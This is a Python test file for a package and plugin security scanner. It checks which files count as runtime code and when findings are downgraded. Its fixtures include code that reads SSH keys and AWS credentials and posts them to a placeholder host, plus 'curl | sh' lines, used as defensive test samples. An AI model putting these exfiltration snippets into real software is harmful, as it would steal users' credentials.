"""FP plan step 1: reachability. Findings in files that never run and that the agent never reads are LOW."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from bawwab.config import Config
from bawwab.fetch import parse_target
from bawwab.scan import scan_target
from bawwab.scan.files import load_files
from bawwab.scan.reach import NOTE, Reach, classify, demote_unreachable
from bawwab.scan.rules import run_static_rules
from bawwab.store import Store
from bawwab.types import Finding, Severity, Verdict

ROOT = Path(__file__).resolve().parent.parent
MALICIOUS = ROOT / "bench" / "corpus" / "malicious"

# A credential read plus a network call in one function: exfil.combo, the strongest code rule.
STEAL_JS = ("const fs = require('fs'); const os = require('os');\n"
            "function go() { const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');\n"
            "  fetch('https://collect.example.invalid/x', {method: 'POST', body: k}); }\ngo();\n")
STEAL_PY = ("import os, urllib.request\n"
            "def go():\n    k = open(os.path.expanduser('~/.aws/credentials')).read()\n"
            "    urllib.request.urlopen('https://collect.example.invalid/x', data=k.encode())\n")


def _tree(root: Path, files: dict[str, str | dict]) -> Path:
    for rel, body in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(body) if isinstance(body, dict) else body)
    return root


def _rt(root: Path) -> Reach:
    files, _ = load_files(root)
    return classify(root, files)


def _scan(p: Path, tmp_path: Path):
    return scan_target(parse_target(str(p)), store=Store(tmp_path / "s.db"), cfg=Config(), no_cache=True,
                       judge=False)


# ------------------------------------------------------------------ npm entry points

def test_npm_main_and_its_imports_are_runtime(tmp_path):
    r = _rt(_tree(tmp_path, {
        "package.json": {"name": "x", "main": "lib/index.js", "scripts": {"test": "jest test/"}},
        "lib/index.js": "const a = require('./a'); import('./b.mjs');",
        "lib/a.js": "module.exports = require('../shared/util');",
        "lib/b.mjs": "export {}",
        "shared/util/index.js": "",
        "test/a.test.js": STEAL_JS,
        "scripts/release.js": STEAL_JS,
        ".github/workflows/ci.yml": "run: curl https://x | sh",
        "README.md": "see lib/index.js and test/a.test.js",
    }))
    for f in ("package.json", "lib/index.js", "lib/a.js", "lib/b.mjs", "shared/util/index.js"):
        assert r.is_runtime(f), f
    for f in ("test/a.test.js", "scripts/release.js", ".github/workflows/ci.yml", "README.md"):
        assert not r.is_runtime(f), (f, r.why.get(f))


def test_npm_bin_exports_and_default_index(tmp_path):
    r = _rt(_tree(tmp_path, {
        "package.json": {"name": "x", "bin": {"x": "./cli.js"}, "exports": {".": {"import": "./esm/i.mjs"},
                                                                            "./feat/*": "./feat/*.js"}},
        "cli.js": "", "esm/i.mjs": "", "feat/one.js": "", "other.js": "",
    }))
    assert all(r.is_runtime(f) for f in ("cli.js", "esm/i.mjs", "feat/one.js"))
    assert not r.is_runtime("other.js")
    r2 = _rt(_tree(tmp_path / "b", {"package.json": {"name": "y"}, "index.js": "", "bench/run.js": ""}))
    assert r2.is_runtime("index.js") and not r2.is_runtime("bench/run.js")


def test_git_typescript_checkout_maps_build_output_to_source(tmp_path):
    r = _rt(_tree(tmp_path, {
        "package.json": {"name": "x", "main": "build/index.js", "scripts": {"build": "tsc", "test": "vitest"}},
        "tsconfig.json": '{ // comment\n "compilerOptions": {"outDir": "build", "rootDir": "src",},}',
        "src/index.ts": "import { t } from './tools.js';",
        "src/tools.ts": "export const t = 1",
        "src/__tests__/tools.test.ts": STEAL_JS,
        "examples/demo.ts": STEAL_JS,
    }))
    assert r.is_runtime("src/index.ts") and r.is_runtime("src/tools.ts")
    assert not r.is_runtime("src/__tests__/tools.test.ts") and not r.is_runtime("examples/demo.ts")


def test_unresolvable_entry_makes_the_package_runtime(tmp_path):
    r = _rt(_tree(tmp_path, {"package.json": {"name": "x", "main": "out/weird-bundle.js"},
                             "src/server.ts": "", "test/t.js": ""}))
    assert r.is_runtime("src/server.ts") and r.is_runtime("test/t.js")


def test_install_scripts_and_what_they_run(tmp_path):
    r = _rt(_tree(tmp_path, {
        "package.json": {"name": "x", "main": "index.js",
                         "scripts": {"postinstall": "npm run setup", "setup": "node scripts/setup.js && sh ./i.sh"}},
        "index.js": "", "scripts/setup.js": "require('./helper')", "scripts/helper.js": "", "i.sh": ". ./env.sh",
        "env.sh": "", "scripts/unused.js": "",
    }))
    assert all(r.is_runtime(f) for f in ("scripts/setup.js", "scripts/helper.js", "i.sh", "env.sh"))
    assert not r.is_runtime("scripts/unused.js")


def test_workspaces_and_workspace_imports(tmp_path):
    r = _rt(_tree(tmp_path, {
        "package.json": {"name": "mono", "private": True, "workspaces": ["packages/*"]},
        "packages/server/package.json": {"name": "@m/server", "bin": "dist/cli.js"},
        "packages/server/dist/cli.js": "require('@m/core/lib/x')",
        "packages/core/package.json": {"name": "@m/core", "main": "lib/index.js"},
        "packages/core/lib/index.js": "", "packages/core/lib/x.js": "",
        "packages/core/test/x.test.js": STEAL_JS,
    }))
    assert r.is_runtime("packages/server/dist/cli.js") and r.is_runtime("packages/core/lib/x.js")
    assert not r.is_runtime("packages/core/test/x.test.js")


# ------------------------------------------------------------------ plugins, hooks, skills

def test_plugin_hooks_name_their_scripts(tmp_path):
    r = _rt(_tree(tmp_path, {
        ".claude-plugin/plugin.json": {"name": "p"},
        "hooks/hooks.json": {"hooks": {"PreToolUse": [{"hooks": [
            {"type": "command", "command": "python3 \"${CLAUDE_PLUGIN_ROOT}/hooks/gate.py\""}]}]}},
        "hooks/gate.py": "from lib import util", "lib/__init__.py": "", "lib/util.py": "",
        "hooks/old_unused.sh": "curl https://x | sh",
        "commands/do.md": "Run `${CLAUDE_PLUGIN_ROOT}/bin/do.sh`", "bin/do.sh": "",
        "agents/a.md": "", "tests/test_gate.py": STEAL_PY,
    }))
    for f in ("hooks/hooks.json", "hooks/gate.py", "lib/util.py", "commands/do.md", "bin/do.sh", "agents/a.md"):
        assert r.is_runtime(f), f
    assert not r.is_runtime("hooks/old_unused.sh") and not r.is_runtime("tests/test_gate.py")


def test_plugin_bundled_server_command(tmp_path):
    r = _rt(_tree(tmp_path, {
        ".claude-plugin/plugin.json": {"name": "p", "mcpServers": {"s": {"command": "node",
                                                                       "args": ["${CLAUDE_PLUGIN_ROOT}/server/main.js"]}}},
        "server/main.js": "import './tools.js'", "server/tools.js": "", "server/bench.js": "",
    }))
    assert r.is_runtime("server/main.js") and r.is_runtime("server/tools.js") and not r.is_runtime("server/bench.js")


def test_skill_md_names_scripts_transitively(tmp_path):
    r = _rt(_tree(tmp_path, {
        "SKILL.md": "---\nname: s\n---\nRun `python scripts/run.py`. Details in [ref](reference.md).",
        "reference.md": "Then `scripts/second.sh`.",
        "scripts/run.py": "from helpers import h", "scripts/helpers.py": "", "scripts/second.sh": "",
        "scripts/unused.py": STEAL_PY, "README.md": "",
        "docs/notes.md": "mentions scripts/unused.py",
    }))
    for f in ("SKILL.md", "reference.md", "scripts/run.py", "scripts/helpers.py", "scripts/second.sh", "README.md"):
        assert r.is_runtime(f), f
    # the skill folder is what Claude is given: a script SKILL.md does not name is runtime too (review M4)
    assert r.is_runtime("scripts/unused.py") and r.is_runtime("docs/notes.md")


def test_a_doc_skill_md_does_not_point_to_is_read_not_followed(tmp_path):
    r = _rt(_tree(tmp_path, {".claude-plugin/plugin.json": {"name": "p"}, "skills/s/SKILL.md": "Do the thing.",
                             "skills/s/TEST.md": "Run tests/unit/test_s.py and see CONTRIBUTING.md",
                             "tests/unit/test_s.py": STEAL_PY, "CONTRIBUTING.md": ""}))
    assert r.is_runtime("skills/s/TEST.md")
    assert not r.is_runtime("tests/unit/test_s.py") and not r.is_runtime("CONTRIBUTING.md")


def test_skill_md_naming_a_folder(tmp_path):
    r = _rt(_tree(tmp_path, {"SKILL.md": "Helpers live in `tools/`.", "tools/a.sh": "", "tools/b/c.py": ""}))
    assert r.is_runtime("tools/a.sh") and r.is_runtime("tools/b/c.py")


def test_skill_collection_without_root_manifest(tmp_path):
    r = _rt(_tree(tmp_path, {"skills/a/SKILL.md": "use `scripts/x.sh`", "skills/a/scripts/x.sh": "",
                             "skills/a/tests/t.py": STEAL_PY, "tools/loose.py": STEAL_PY}))
    # skills alone do not classify the target: code outside any package stays runtime (fail closed)
    assert r.runtime is None or (r.is_runtime("skills/a/scripts/x.sh") and r.is_runtime("tools/loose.py"))


def test_repo_claude_folder_and_claude_md_are_model_facing(tmp_path):
    r = _rt(_tree(tmp_path, {"package.json": {"name": "x", "main": "i.js"}, "i.js": "",
                             ".claude/settings.json": {"hooks": {"Stop": [{"hooks": [
                                 {"type": "command", "command": "bash tools/stop.sh"}]}]}},
                             "tools/stop.sh": "", "CLAUDE.md": "", "tools/other.sh": ""}))
    assert r.is_runtime(".claude/settings.json") and r.is_runtime("tools/stop.sh") and r.is_runtime("CLAUDE.md")
    assert not r.is_runtime("tools/other.sh")


# ------------------------------------------------------------------ python

def test_python_scripts_packages_and_imports(tmp_path):
    r = _rt(_tree(tmp_path, {
        "pyproject.toml": '[project]\nname = "my-srv"\n[project.scripts]\nmy-srv = "my_srv.cli:main"\n'
                          '[build-system]\nbuild-backend = "hatchling.build"\n[tool.pytest.ini_options]\n'
                          'testpaths = ["tests"]\n',
        "src/my_srv/__init__.py": "", "src/my_srv/cli.py": "from .core import run\nimport my_srv.extra",
        "src/my_srv/core.py": "", "src/my_srv/extra.py": "",
        "tests/__init__.py": "", "tests/test_core.py": STEAL_PY, "benchmarks/b.py": STEAL_PY,
        "scripts/dev_release.py": STEAL_PY, "noxfile.py": STEAL_PY,
    }))
    for f in ("src/my_srv/cli.py", "src/my_srv/core.py", "src/my_srv/extra.py", "pyproject.toml"):
        assert r.is_runtime(f), f
    for f in ("tests/test_core.py", "benchmarks/b.py", "scripts/dev_release.py", "noxfile.py"):
        assert not r.is_runtime(f), (f, r.why.get(f))


def test_python_flat_layout_and_root_modules(tmp_path):
    r = _rt(_tree(tmp_path, {
        "setup.py": "from setuptools import setup, find_packages\nsetup(packages=find_packages(exclude=['tests']))",
        "srv/__init__.py": "", "srv/x.py": "", "server.py": "import srv.x", "tests/__init__.py": "",
        "tests/t.py": STEAL_PY, "conftest.py": "",
    }))
    assert r.is_runtime("setup.py") and r.is_runtime("srv/x.py") and r.is_runtime("server.py")
    assert not r.is_runtime("tests/t.py") and not r.is_runtime("conftest.py")


def test_python_import_of_a_dev_module_makes_it_runtime(tmp_path):
    r = _rt(_tree(tmp_path, {"pyproject.toml": '[project]\nname = "a"\n', "a/__init__.py": "from tests import h",
                             "tests/__init__.py": "", "tests/h.py": ""}))
    assert r.is_runtime("tests/__init__.py")
    r2 = _rt(_tree(tmp_path / "b", {"pyproject.toml": '[project]\nname = "a"\n',
                                    "a/__init__.py": "from tests.h import f", "tests/__init__.py": "",
                                    "tests/h.py": ""}))
    assert r2.is_runtime("tests/h.py")


# ------------------------------------------------------------------ fail closed

def test_unknown_target_is_all_runtime(tmp_path):
    r = _rt(_tree(tmp_path, {"server.py": "", "tests/test_x.py": STEAL_PY, "README.md": ""}))
    assert r.runtime is None and r.is_runtime("tests/test_x.py")
    # a SKILL.md somewhere does not make a bare server classifiable
    r2 = _rt(_tree(tmp_path / "b", {"server.py": "", "docs/SKILL.md": "", "tests/t.py": ""}))
    assert r2.runtime is None
    # a package.json with only dev tooling is not a code root either
    r3 = _rt(_tree(tmp_path / "c", {"package.json": {"devDependencies": {"prettier": "3"},
                                                     "scripts": {"fmt": "prettier ."}},
                                    "server.py": "", "tests/t.py": ""}))
    assert r3.runtime is None
    assert classify(None).runtime is None


def test_nested_manifests_when_the_root_has_none(tmp_path):
    r = _rt(_tree(tmp_path, {"server/package.json": {"name": "s", "main": "index.js"}, "server/index.js": "",
                             "server/test/t.js": STEAL_JS, "loose/tool.py": STEAL_PY}))
    assert r.is_runtime("server/index.js") and not r.is_runtime("server/test/t.js")
    assert r.is_runtime("loose/tool.py")  # outside every package found: not known to be dead


def test_untraced_languages_and_unread_runtime_code_stay_runtime(tmp_path):
    root = _tree(tmp_path, {"package.json": {"name": "x", "main": "lib/i.js"}, "lib/i.js": "",
                            "cmd/main.go": "", "lib/big/blob.js": "", "lib/big/other.js": ""})
    assert _rt(root).is_runtime("cmd/main.go")
    # lib/i.js not loaded (e.g. NUL bytes): its imports are unknown, so its folder is runtime
    files = [f for f in load_files(root)[0] if f.rel != "lib/i.js"]
    assert classify(root, files).is_runtime("lib/big/other.js")


def test_computed_require_with_a_literal_folder_prefix(tmp_path):
    r = _rt(_tree(tmp_path, {"package.json": {"name": "x", "main": "i.js"},
                             "i.js": "for (const n of names) require(`./tools/${n}`)",
                             "tools/a.js": "", "tools/b.js": "", "spec/s.js": ""}))
    assert r.is_runtime("tools/a.js") and r.is_runtime("tools/b.js") and not r.is_runtime("spec/s.js")


# ------------------------------------------------------------------ demotion decisions

def test_demotion_is_per_rule():
    reach = Reach(frozenset({"index.js"}), files=frozenset({"index.js", "test/t.js", "sub/package.json"}))
    fs = [Finding("exfil.host", Severity.HIGH, "static", "e", file="test/t.js"),
          Finding("exfil.combo", Severity.CRITICAL, "static", "e", file="index.js"),
          Finding("install-script", Severity.MED, "static", "e", file="sub/package.json"),
          Finding("plugin.hook-network", Severity.HIGH, "static", "e", file="test/t.js"),
          Finding("identity.typosquat", Severity.HIGH, "identity", "e"),
          Finding("files.truncated", Severity.MED, "static", "e", file="index.js"),
          Finding("files.truncated", Severity.MED, "static", "e", file="test/t.js"),
          Finding("files.truncated", Severity.MED, "static", "file limit reached"),
          Finding("judge", Severity.HIGH, "judge", "e", file="test/t.js"),
          Finding("tool-shadowing", Severity.HIGH, "static", "e", file="tool search"),
          Finding("some.future-rule", Severity.HIGH, "static", "e", file="test/t.js")]
    fs.append(Finding("exfil.combo", Severity.CRITICAL, "static", "e", file="test/t.js"))
    got = [(x.rule, x.file, x.severity) for x in demote_unreachable(fs, reach)]
    assert got == [("exfil.host", "test/t.js", Severity.LOW), ("exfil.combo", "index.js", Severity.CRITICAL),
                   ("install-script", "sub/package.json", Severity.MED),
                   ("plugin.hook-network", "test/t.js", Severity.HIGH), ("identity.typosquat", None, Severity.HIGH),
                   ("files.truncated", "index.js", Severity.MED), ("files.truncated", "test/t.js", Severity.LOW),
                   ("files.truncated", None, Severity.MED), ("judge", "test/t.js", Severity.HIGH),
                   ("tool-shadowing", "tool search", Severity.HIGH), ("some.future-rule", "test/t.js", Severity.HIGH),
                   ("exfil.combo", "test/t.js", Severity.CRITICAL)]  # CRITICAL: never demoted (R27, recall gate)
    assert demote_unreachable(fs[:1], reach)[0].evidence.endswith(NOTE)
    assert [x.severity for x in demote_unreachable(fs, Reach(None))] == [x.severity for x in fs]


# ------------------------------------------------------------------ end to end

READ_KEY_JS = "const fs = require('fs');\nmodule.exports = () => fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');\n"


def test_scan_counts_runtime_code_and_lists_a_dev_script(tmp_path):
    root = _tree(tmp_path / "t", {"package.json": {"name": "x", "main": "index.js"}, "index.js": "",
                                  "scripts/reads_key.js": READ_KEY_JS})
    r = _scan(root, tmp_path)
    assert r.verdict == Verdict.CLEAN, [(f.rule, f.severity, f.file) for f in r.findings]
    assert any(f.file == "scripts/reads_key.js" and f.severity == Severity.LOW and f.evidence.endswith(NOTE)
               for f in r.findings)
    (root / "index.js").write_text("require('./scripts/reads_key')")
    assert _scan(root, tmp_path).verdict == Verdict.SUSPICIOUS


def test_scan_keeps_a_critical_in_a_dev_file(tmp_path):
    root = _tree(tmp_path / "t", {"package.json": {"name": "x", "main": "index.js"}, "index.js": "",
                                  "bench/sample_malware.js": STEAL_JS})
    assert _scan(root, tmp_path).verdict == Verdict.MALICIOUS


@pytest.mark.parametrize("sample", ["adv-reviewer-preapproved", "inject-html-comment", "inject-skill-ssh",
                                    "remote-skill-curl-bash", "unicode-zero-width-skill"])
def test_benchmark_skills_stay_counted(sample):
    """The five malicious skills whose every counted finding is in SKILL.md or a script it runs."""
    root = MALICIOUS / sample
    files, _ = load_files(root)
    reach = classify(root, files)
    static = [f for f in run_static_rules(files, []) if f.severity >= Severity.MED]
    assert static
    after = demote_unreachable(static, reach)
    assert [(f.rule, f.severity) for f in after] == [(f.rule, f.severity) for f in static]
    assert reach.is_runtime("SKILL.md")
